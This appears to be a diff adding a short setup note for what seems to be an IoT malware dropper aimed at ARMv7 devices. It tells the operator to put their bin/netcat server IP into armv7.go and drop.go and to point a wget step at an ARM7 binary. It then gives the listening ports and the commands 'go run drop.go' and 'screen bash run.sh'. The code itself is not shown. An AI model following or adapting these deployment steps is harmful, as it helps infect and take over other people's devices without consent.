@@ -1,0 +1,16 @@
+
+
+replace on line 194 in armv7.go change the 0.0.0.0 to the ip of your binserver/nc server
+
+inside drop.go change the wget ip 0.0.0.0 your own. and the arm7 bin to your corresponding arm7 binary.
+
+put dropper.go on your binserver / nc server.
+
+run cmd : go run drop.go
+
+ - it will be on port 9.
+
+ports, 80,60001
+
+
+run cmd : screen bash run.sh
